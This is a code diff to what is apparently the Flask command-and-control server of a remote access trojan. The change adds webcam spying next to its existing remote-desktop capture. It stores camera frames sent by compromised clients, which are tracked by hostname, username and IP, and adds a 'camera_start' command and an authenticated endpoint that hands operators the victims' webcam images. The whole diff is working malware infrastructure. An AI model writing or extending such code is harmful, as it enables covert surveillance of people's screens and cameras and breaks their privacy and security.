@@ -17,9 +17,11 @@ from flask_sock import Sock
 app = Flask(__name__, static_folder='public')
 sock = Sock(app)
 
-# In-memory frame storage for Remote Desktop
+# In-memory frame storage for Remote Desktop & Webcam
 rdp_frames = {}
 rdp_frames_lock = threading.Lock()
+camera_frames = {}
+camera_frames_lock = threading.Lock()
 
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
@@ -851,8 +853,13 @@ def c2_websocket(ws):
                 ws.send('{"type":"ping"}')
                 continue
             if isinstance(data, bytes):
-                with rdp_frames_lock:
-                    rdp_frames[client_id] = {'data': data, 'ts': time.time()}
+                if len(data) > 1 and data[0] == 0x43:  # 'C' = Camera
+                    with camera_frames_lock:
+                        camera_frames[client_id] = {'data': data[1:], 'ts': time.time()}
+                else:
+                    raw = data[1:] if (len(data) > 1 and data[0] == 0x53) else data
+                    with rdp_frames_lock:
+                        rdp_frames[client_id] = {'data': raw, 'ts': time.time()}
                 continue
             msg = json.loads(data)
             if msg.get('type') == 'pong':
@@ -930,6 +937,9 @@ def c2_send_command():
         if command.startswith('rdp_start'):
             with rdp_frames_lock:
                 rdp_frames[client_id] = {'data': b'', 'ts': time.time()}
+        elif command.startswith('camera_start'):
+            with camera_frames_lock:
+                camera_frames[client_id] = {'data': b'', 'ts': time.time()}
         return jsonify({'success': True})
     except Exception:
         return jsonify({'error': 'send failed'}), 500
@@ -943,6 +953,31 @@ def c2_get_frame(client_id):
     user = request.current_user
     with rdp_frames_lock:
         frame = rdp_frames.get(client_id)
+    if not frame:
+        return '', 204
+
+    try:
+        last_ts = float(request.args.get('ts', 0))
+    except (ValueError, TypeError):
+        last_ts = 0
+
+    if frame['ts'] <= last_ts:
+        return '', 304
+
+    return jsonify({
+        'ts': frame['ts'],
+        'b64': base64.b64encode(frame['data']).decode('ascii')
+    })
+
+
+# ===== REMOTE CAMERA FRAME ENDPOINT =====
+
+@app.route('/api/c2/camera_frame/<client_id>')
+@login_required
+def c2_get_camera_frame(client_id):
+    user = request.current_user
+    with camera_frames_lock:
+        frame = camera_frames.get(client_id)
     if not frame:
         return '', 204
 
